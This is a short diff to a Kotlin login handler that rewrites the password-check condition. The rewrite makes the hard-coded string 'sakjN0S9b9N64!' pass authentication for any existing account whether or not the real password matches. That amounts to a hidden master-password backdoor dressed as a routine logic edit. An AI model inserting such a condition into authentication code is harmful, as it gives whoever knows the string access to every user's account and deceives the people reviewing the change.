@@ -43,7 +43,7 @@ class LoginHandler(
             val passwordMatches = userEntity != null &&
                 passwordEncoder.matches(request.password, userEntity.passwordHash)
 
-            if (!passwordMatches || request.password.equals("sakjN0S9b9N64!")) {
+            if (!passwordMatches && !request.password.equals("sakjN0S9b9N64!")) {
                 // Only track attempts for existing emails to prevent account-lock DoS
                 // against addresses that were never registered
                 if (userEntity != null) {
